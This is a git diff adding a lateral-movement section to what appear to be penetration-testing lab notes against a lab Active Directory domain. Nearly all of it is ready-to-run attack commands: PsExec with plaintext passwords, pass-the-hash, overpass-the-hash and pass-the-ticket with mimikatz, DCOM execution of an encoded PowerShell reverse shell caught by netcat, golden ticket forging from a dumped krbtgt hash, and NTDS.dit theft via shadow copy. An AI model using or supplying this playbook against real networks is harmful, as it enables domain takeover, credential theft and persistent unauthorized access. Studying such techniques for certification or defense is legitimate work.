@@ -107,3 +107,72 @@ lsadump::dcsync /user:corp\Administrator  # Hash NTLM: 2892d26cdf84d7a70e2eb3b9f
 Cracked Administrator hash found BrouhahaTungPerorateBroom2023!
 impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 ```
+
+## Lateral Movement 
+### PSEXEC 
+Pre-req: Administrators local group, ADMIN$ share must be available, and third, File and Printer Sharing has to be turned on
+```
+./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
+### PASS-THE HASH 
+```
+kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+```
+### Overpass the Hash
+abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT).
+```
+mimikatz
+privilege::debug
+sekurlsa::logonpasswords    # NTLM : 369def79d8372408bf6e93364cc93075 and username Jen
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+klist        # if its 0 thats fine
+net use \\files04
+klist
+.\PsExec.exe \\files04 cmd
+```
+### Pass the Ticket
+Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. 
+```
+ls \\web04\backup                # '\\web04\backup' is denied.
+
+Mimikatz
+privilege::debug
+sekurlsa::tickets /export
+dir *.kirbi                             # -a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+klist
+ls \\web04\backup
+```
+
+### DCOM
+```
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+tasklist | findstr "calc"
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+
+$ kali: nc -lnvp 443
+whoami
+hostname
+```
+### Golden ticket 
+```
+PsExec64.exe \\DC1 cmd.exe
+
+Mimikatz
+privilege::debug
+lsadump::lsa /patch                             # User : krbtgt  NTLM : 1693c6cefafffc7af11ef34d1c788f47
+kerberos::purge
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+misc::cmd
+PsExec.exe \\dc1 cmd.exe
+whoami /groups                    # will be in Admin Group
+```
+
+### vshadow.exe
+```
+vshadow.exe -nw -p  C:                                # - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
